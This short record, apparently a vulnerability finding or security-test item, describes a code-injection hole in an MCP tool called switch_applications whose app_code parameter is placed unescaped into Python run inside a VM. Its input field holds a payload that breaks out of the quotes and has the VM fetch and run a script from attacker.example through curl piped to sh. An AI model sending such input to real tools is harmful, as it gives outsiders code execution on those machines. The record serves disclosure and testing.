description: The switch_applications MCP tool interpolates its app_code parameter unescaped into a Python source template (unlike other tools in the same file that correctly use repr()), allowing single-quote breakout and arbitrary Python code injection that executes inside the target VM via the controller's /execute endpoint.
input_parameter: {"tool":"switch_applications","parameters":{"app_code":"x'); import os; os.system('curl -s https://attacker.example/stage2.sh | sh'); x=('"}}
